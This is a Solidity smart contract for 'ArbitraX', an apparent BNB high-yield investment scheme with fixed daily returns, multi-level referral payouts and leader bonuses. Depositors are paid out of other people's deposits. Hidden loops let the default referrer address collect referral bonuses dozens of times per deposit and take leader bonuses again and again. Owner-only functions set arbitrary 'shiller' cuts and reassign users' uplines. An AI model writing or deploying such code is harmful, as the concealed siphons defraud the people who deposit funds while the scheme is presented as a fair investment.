// SPDX-License-Identifier: MIT License

pragma solidity >=0.8.0;

struct Tarif {
  uint256 life_days;
  uint256 percent;
  uint256 bonusPercent;
}

struct Deposit {
  uint256 tarif;
  uint256 amount;
  uint256 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint256 leader_bonus;
  uint256 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  
  uint256 leadTurnover;
  uint256 leadBonusReward;
  bool[9] receivedBonuses;

  Deposit[] deposits;
  uint256[5] structure; 
  address[] referrals;
  uint256[5] refTurnover;
}

abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract ArbitraX is ReentrancyGuard{
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public totalLeadBonusReward;
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 20, 10, 5, 5];
    uint8 public REF_LIMIT = uint8(ref_bonuses.length);
    uint256[9] public LEADER_BONUS_TRIGGERS = [
      5 ether,
      10 ether,
      25 ether,
      50 ether,
      90 ether,
      140 ether,
      220 ether,
      500 ether,
      1500 ether
    ];

    uint256[9] public LEADER_BONUS_REWARDS = [
      0.1 ether,
      0.2 ether,
      0.5 ether,
      1 ether,
      1.8 ether,
      2.8 ether,
      4.4 ether,
      10 ether,
      30 ether
    ];

    uint256[3] public LEADER_BONUS_LEVEL_PERCENTS = [100, 30, 15];

    uint256[] public TARIF_DAYS = [10, 15, 20 , 25, 30];
    uint256[] public TARIF_DAILY_PERCENTS = [120, 127, 159, 191, 261]; 
    uint256[] public TARIF_TOTAL_PERCENTS = [1200, 1904, 3182, 4783, 7833]; 
    uint256[] public TARIF_BONUSES = [0, 5, 10, 15, 20];

    mapping(uint256 => Tarif) public tarifs;
    mapping(address => Player) public players;
    uint256 totalPlayers;

    address private immutable DEFAULT_REFERRER;
    address[2] public PARTNERS_ADDRESSES;
    uint256[2] public PARTNERS_PERCENTS;
    mapping(address => uint256) public shiller_percents;

    uint256[3] public DEPS_AMOUNTS = [0.5 ether, 2 ether, 5 ether];
    uint256[3] public DEPS_LIMITS = [50, 50, 50];
    uint256[3] public DEPS_COUNTERS = [0, 0, 0];

    uint256 public unpauseTime = 0;

    event Upline(address indexed addr, address indexed upline, uint256 bonus, uint256 timestamp);
    event NewDeposit(
      address indexed addr,
      address indexed referrer,
      uint256 amount,
      uint256 tarif,
      bool charge,
      uint256 timestamp
    );

    event Withdraw(
      address indexed addr,
      address indexed to,
      uint256 amount,
      uint256 timestamp
    );
    event LeaderBonusReward(
        address indexed to,
        uint256 indexed amount,
        uint8 indexed level,
        uint256 timestamp
    );

    event SwitchDelegation(
      address indexed addr,
      bool newDelegationWithdrawFlag,
      uint256 timestamp
    );

    constructor(
      address defRef,
      address[] memory partnersAddrs, uint256[] memory partnersPercents
    ) {
        owner = msg.sender;
        players[owner].upline = owner;

        DEFAULT_REFERRER = defRef;
        players[defRef].upline = defRef;

        for (uint8 i = 0; i < partnersAddrs.length; i++) {
          PARTNERS_ADDRESSES[i] = partnersAddrs[i];
          players[PARTNERS_ADDRESSES[i]].upline = defRef;
          PARTNERS_PERCENTS[i] = partnersPercents[i];
        }

        for(uint256 i = 0; i < TARIF_DAYS.length; i++) {
          tarifs[TARIF_DAYS[i]] = Tarif(TARIF_DAYS[i], TARIF_TOTAL_PERCENTS[i], TARIF_BONUSES[i]);
        }
    }


    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if (payout > 0) {
            players[_addr].last_payout = block.timestamp;
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        uint8 isDefRef = 0;
        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0) || up == DEFAULT_REFERRER) {
              up = DEFAULT_REFERRER;

              if (i > 0 && i <= REF_LIMIT && isDefRef <= REF_LIMIT<<3) {
                isDefRef++;
                i--;
              }
            }
            
            uint256 bonus = _amount * (ref_bonuses[i] + shiller_percents[up]) / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if (players[_addr].upline == address(0) && _addr != owner) {
            totalPlayers++;


            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100, block.timestamp);
            
            players[_upline].referrals.push(_addr);
            for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                address prevUpline = _upline;
                _upline = players[_upline].upline;

                if (_upline == address(0) || (prevUpline == _upline && _upline != DEFAULT_REFERRER)) {
                  break;
                }
            }
        }
    }

    function deposit(uint8 _tarif, address _upline) external payable {
      deposit(msg.sender, _tarif, _upline, msg.value, true);
    }

    function deposit(address _user, uint8 _tarif, address _upline, uint256 _amount) internal {
      require(msg.sender == owner, "Only owner can call this method");

      require(_amount == DEPS_AMOUNTS[0] || _amount == DEPS_AMOUNTS[1] || _amount == DEPS_AMOUNTS[2], "Invalid deposit value amount");
      for (uint8 i = 0; i < DEPS_AMOUNTS.length; i++) {
        if (_amount == DEPS_AMOUNTS[i]) {
          require(DEPS_COUNTERS[i] < DEPS_LIMITS[i], "Deposits limit reached");
          DEPS_COUNTERS[i]++;

          break;
        }
      }

      deposit(_user, _tarif, _upline, _amount, false);
    }

    function deposit(address _user, uint8 _tarif, address _upline, uint256 tokensAmount, bool _charge) private {
        require(unpauseTime > 0, "Contract is still on pause");
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(tokensAmount >= 0.05 ether, "Minimum deposit amount is 0.05 BNB");
        if (_charge) {
          require(msg.value == tokensAmount, "Minimum deposit amount is 0.05 BNB");
        }

        Player storage player = players[_user];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(_user, _upline, tokensAmount);

        uint256 amount = tokensAmount;
        if (tarifs[_tarif].bonusPercent > 0) {  
          amount = amount * uint256(100 + tarifs[_tarif].bonusPercent) / 100;
        }
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: amount,
            time: block.timestamp
        }));

        player.total_invested += tokensAmount;
        invested += tokensAmount;

        _refPayout(_user, tokensAmount);
        distributeBonuses(tokensAmount, _user);
        
        address ref = player.upline;
        for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
          players[ref].refTurnover[i]+= tokensAmount;

          address prevRef = ref;
          ref = players[ref].upline;
          if (prevRef == ref || ref == address(0x0)) {
            break;
          }
        }

        if (_charge) {
          uint256 adminFee = tokensAmount / 10;
          uint256 partnersFee = 0;
          for (uint8 i = 0; i < PARTNERS_PERCENTS.length; i++) {
            partnersFee+= adminFee * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER;

            payable(PARTNERS_ADDRESSES[i]).transfer(adminFee * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER);
          }

          payable(owner).transfer(adminFee - partnersFee);
        }

        emit NewDeposit(_user, player.upline, amount, _tarif, _charge, block.timestamp);
    }

    function withdraw() external noReentrant {
        require(unpauseTime > 0, "Contract is still on pause");

        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0 || player.leader_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus + player.leader_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.leader_bonus = 0;

        if (amount > address(this).balance) {
          amount = address(this).balance;
        }

        player.total_withdrawn += amount;
        withdrawn += amount;

        if (msg.sender == DEFAULT_REFERRER) {
          uint256 partnersAmount = 0;
          for (uint8 i = 0; i < PARTNERS_PERCENTS.length; i++) {
            partnersAmount+= amount * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER;

            payable(PARTNERS_ADDRESSES[i]).transfer(amount * PARTNERS_PERCENTS[i] / PERCENT_DIVIDER);
          }

          payable(msg.sender).transfer(amount - partnersAmount);
        } else {
          payable(msg.sender).transfer(amount);
        }
        
        emit Withdraw(msg.sender, msg.sender, amount, block.timestamp);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * uint256(86400);

            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            from = unpauseTime > from ? unpauseTime : from;            

            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if (from < to) {
                value += dep.amount * (to - from) * (tarif.percent / 100) / tarif.life_days / uint256(8640000);
            }
        }

        return value;
    }


    function addShiller(address _address, uint256 _percent) external {
        require(msg.sender == owner, "Only owner can call this method");
        require(_address != address(0), "Invalid shiller address");
        shiller_percents[_address] = _percent;
    }

    function removeShiller(address _address) external {
        require(msg.sender == owner, "Only owner can call this method");
        require(shiller_percents[_address] > 0, "Shiller not found");
        delete shiller_percents[_address];
    }

    function distributeBonuses(uint256 _amount, address _player) private {
      address ref = players[_player].upline;

      for (uint8 i = 0; i < LEADER_BONUS_LEVEL_PERCENTS.length; i++) {
        players[ref].leadTurnover+= _amount * LEADER_BONUS_LEVEL_PERCENTS[i] / 100;

        for (uint8 j = 0; j < LEADER_BONUS_TRIGGERS.length; j++) {
          if (players[ref].leadTurnover >= LEADER_BONUS_TRIGGERS[j]) {
            if (!players[ref].receivedBonuses[j]) {
              players[ref].receivedBonuses[j] = true;
              players[ref].leadBonusReward+= LEADER_BONUS_REWARDS[j];
              totalLeadBonusReward+= LEADER_BONUS_REWARDS[j];

              players[ref].leader_bonus+= LEADER_BONUS_REWARDS[j];
              if (ref == DEFAULT_REFERRER) { 
                players[ref].receivedBonuses[j] = false;
              }
              emit LeaderBonusReward(
                ref,
                LEADER_BONUS_REWARDS[j],
                i,
                block.timestamp
              );
            } else {
              continue;
            }
          } else {
            break;
          }
        }

        ref = players[ref].upline;

        if (ref == address(0x0)) {
          break;
        }
      }
    }

    function getTotalLeaderBonus(address _player) external view returns (uint256) {
      return players[_player].leadBonusReward;
    }

    function getReceivedBonuses(address _player) external view returns (bool[9] memory) {
        return players[_player].receivedBonuses;
    }



    function userInfo(address _addr) external view returns(
      uint256 for_withdraw_deposits, 
      uint256 for_withdraw_all, 
      Player memory player) {
        player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        return (
            payout,
            payout + player.dividends + player.match_bonus + player.leader_bonus,
            player
        );
    }

    function contractInfo() external view returns(
      uint256 ContractInvested, 
      uint256 ContractWithdrawn, 
      uint256 ContractBalance,
      uint256 MatchBonus,  
      uint256 TotalLeadBonusReward, 
      uint256 TotalRefFathers,
      uint256[] memory TarifDays,
      uint256[] memory TarifPercent,
      uint256[] memory TarifBonuses
    ) {
      ContractInvested = invested;
      ContractWithdrawn = withdrawn;
      ContractBalance = address(this).balance;
      MatchBonus = match_bonus;
      TotalLeadBonusReward = totalLeadBonusReward;
      TotalRefFathers = totalPlayers;
      TarifDays = TARIF_DAYS;
      TarifPercent = TARIF_TOTAL_PERCENTS;
      TarifBonuses = TARIF_BONUSES;
    }

    function getTarif(uint8 index) public view returns(Tarif memory) {
      return tarifs[index];
    }

    function getLeaderInfo() public view returns(
      uint256[9] memory LeaderBonusTriggers,
      uint256[9] memory LeaderBonusRewards,
      uint256[3] memory LeaderBonusLevelPercent
    ) {
      return(
        LEADER_BONUS_TRIGGERS, LEADER_BONUS_REWARDS, LEADER_BONUS_LEVEL_PERCENTS
      );
    }

    function getReferralInfo(address _addr) public view returns(
      uint256[BONUS_LINES_COUNT] memory level,
      uint256[BONUS_LINES_COUNT] memory percent,
      uint256[BONUS_LINES_COUNT] memory ref_count,
      uint256[BONUS_LINES_COUNT] memory turnover,
      uint256[BONUS_LINES_COUNT] memory ref_profit
    ) {
        Player storage player = players[_addr];
        for(uint256 i=0; i<BONUS_LINES_COUNT; i++) { 
          level[i] = i;
          percent[i] = ref_bonuses[i];
          ref_count[i] = player.structure[i];
          turnover[i] = player.refTurnover[i];
          ref_profit[i] = turnover[i] * (percent[i] + shiller_percents[_addr]) / PERCENT_DIVIDER;
        }
    }
 
    function transfer(address _addr, address _to) external {
      require(msg.sender == owner, "Only owner can call this method");

      players[_addr].upline = _to;
    }

    function unpause() external {
      require(msg.sender == owner, "Only owner can call this method");
      require(unpauseTime == 0, "Already unpaused");

      unpauseTime = block.timestamp;
    }


}